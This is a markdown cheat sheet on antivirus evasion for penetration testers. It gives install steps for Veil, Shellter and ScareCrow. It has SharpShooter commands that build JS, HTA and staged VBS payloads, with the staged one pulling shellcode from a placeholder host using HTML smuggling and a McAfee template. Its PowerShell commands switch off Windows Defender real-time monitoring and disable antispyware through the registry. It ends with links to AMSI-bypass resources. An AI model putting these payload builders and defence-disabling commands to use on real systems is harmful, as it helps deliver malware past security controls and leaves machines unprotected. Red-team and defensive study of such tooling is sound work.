# AV Bypass
## Contents
- [AV Bypass](#av-bypass)
  * [Contents](#contents)
  * [Tools](#tools)
    + [Veil Framework:](#veil-framework-)
    + [Shellter](#shellter)
    + [Sharpshooter](#sharpshooter)
  * [Donut:](#donut-)
  * [Vulcan](#vulcan)
  * [Scarecrow](#scarecrow)
  * [Sharpshooter](#sharpshooter-1)
  * [Commands](#commands)
- [Resources](#resources)
  * [Cheat sheets](#cheat-sheets)
  * [Workshops](#workshops)


## Tools     

### Veil Framework:

Install on Kali

    apt install veil
    /usr/share/veil/config/setup.sh --force --silent

Reference: https://github.com/Veil-Framework/Veil

### Shellter

Source: https://www.shellterproject.com/download/

    apt install shellter


### Sharpshooter

Javascript Payload Stageless: 

    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

Stageless HTA Payload: 

    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

Staged VBS:

    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

Reference: https://github.com/mdsecactivebreach/SharpShooter

## Donut: 

Source: https://github.com/TheWover/donut

## Vulcan

Source: https://github.com/praetorian-code/vulcan


## Scarecrow

Source: https://github.com/optiv/ScareCrow

In Kali: 

    sudo apt install golang

    go get github.com/fatih/color
    go get github.com/yeka/zip
    go get github.com/josephspurrier/goversioninfo

    go build ScareCrow.go

    ./ScareCrow

## Sharpshooter
[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)   

Javascript Payload Stageless:   

    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

Stageless HTA Payload: 

    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

Staged VBS:

    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4


## Commands 
Turning off Windows Defender 

    Set-MpPreference -DisableRealtimeMonitoring $true   

Need to run Powershell as admin and reboot after running command to turn off Windows Defender indefinetly: 

    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -name disableantispyware -value 1 -Force


View Windows Defender logs   

    Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' MaxEvents 10 | Where-Object Id -e 1116 | Format-List 


# Resources  
## Cheat sheets 
https://github.com/sinfulz/JustEvadeBro   
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell 

[AV Payloads](https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads)    


## Workshops 
https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation 




